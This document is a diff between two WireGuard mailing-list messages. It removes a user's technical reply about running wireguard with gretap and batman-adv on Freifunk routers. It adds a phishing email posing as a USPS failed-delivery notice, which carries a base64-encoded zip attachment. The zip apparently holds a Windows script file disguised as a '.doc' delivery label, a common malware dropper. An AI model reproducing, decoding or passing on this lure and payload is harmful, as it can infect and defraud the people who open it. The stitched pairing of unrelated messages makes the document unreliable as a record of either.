@@ -1,22 +1,21 @@
-Return-Path: jens@viisauksena.de
+Return-Path: fvpcbdxmgn@79988-63009.cloudwaysapps.com
 Received: from krantz.zx2c4.com (localhost [127.0.0.1])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 0883644a
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id f9daad96
  for <wireguard@lists.zx2c4.com>;
- Sun, 25 Dec 2016 04:07:29 +0000 (UTC)
-Received: from viisauksena.de (v32412.1blu.de [178.254.39.111])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 42e0ead6
+ Sun, 25 Dec 2016 10:04:31 +0000 (UTC)
+Received: from 79988-63009.cloudwaysapps.com (79988-63009.cloudwaysapps.com
+ [107.170.253.232])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id c02a74dc
  for <wireguard@lists.zx2c4.com>;
- Sun, 25 Dec 2016 04:07:28 +0000 (UTC)
-Subject: Re: [fyi] test in the wild (wg + gretap + batman-adv) on tplink842
-To: WireGuard mailing list <wireguard@lists.zx2c4.com>
-References: <b9daea6b-caa1-6778-7236-02efb2288b99@viisauksena.de>
- <1482597351.888073.828789001.771C92C9@webmail.messagingengine.com>
-From: jens <jens@viisauksena.de>
-Message-ID: <1439626e-1f99-83fb-aab5-6a316346801e@viisauksena.de>
-Date: Sun, 25 Dec 2016 05:14:47 +0100
+ Sun, 25 Dec 2016 10:04:31 +0000 (UTC)
+To: wireguard@lists.zx2c4.com
+Subject: Notification status of your delivery (USPS 005676955)
+Date: Sun, 25 Dec 2016 10:09:44 +0000
 MIME-Version: 1.0
-In-Reply-To: <1482597351.888073.828789001.771C92C9@webmail.messagingengine.com>
-Content-Type: text/plain; charset=windows-1252
+Message-ID: <f8350ee0637ef6a79ddeb84809a8d835@giraffeideas.com>
+From: "USPS Support Management" <darryl.hancock@giraffeideas.com>
+Content-Type: multipart/mixed; boundary="b1_61b0a484d4fc0ec3c4b56ef69559aaf8"
+Reply-To: USPS Support Management <darryl.hancock@giraffeideas.com>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -26,38 +25,75 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-On 24.12.2016 17:35, Jehan Tremback wrote:
-> Maybe I'm missing something obvious, but why would batman-adv affect th=
-e
-> speed?
+--b1_61b0a484d4fc0ec3c4b56ef69559aaf8
+Content-Type: text/plain; charset=us-ascii
 
-not directly,
+Dear Customer,
 
-or i don't understand where your conclusion came from. batman-adv means
-a lot of little batman-mesh-protocoll packets (namely ogm packets,
-protocoll traffic is around 300 kbits in our network. which also will
-travel over gretap/wireguard)
+Your item has arrived at December 21, but our courier was not able to deliver the parcel.
 
-this scenario is equivalent to our free wifi network with 300++ nodes
-and +-1000 users.
-We use batman-adv as mesh protocol. While wireguard is layer 3 we need
-to have layer2 over this tunnel.
-so i tested wireguard + gretap + batman-adv   successfully.
+Please review delivery label in attachment!
 
-compared to a other known layer2 crypted tunnel protocol (fastd) this is
-3 times faster, which is mainly due to wireguard is a kernel-module and
-fastd lay in userspace. (-> context switche)
-
-i testet on weak devices, because this is what is deployed in big
-numbers in our (and many other) Freifunk community.
-also there are plenty of packets and stuff - so this explain the
-relative low throughput. At least compared with clean linked test-setups.=
+Respectfully,
+Darryl Hancock,
+USPS Parcels Delivery Agent.
 
 
-hope this explain my motivation and the reason why i test this in this
-special scenario.
+--b1_61b0a484d4fc0ec3c4b56ef69559aaf8
+Content-Type: application/zip; name="Undelivered-Package-005676955.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Undelivered-Package-005676955.zip
 
-Jens/fuzzle
+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
+SQoAAAAA
 
---=20
-make the world nicer, please use PGP encryption
+
+--b1_61b0a484d4fc0ec3c4b56ef69559aaf8--
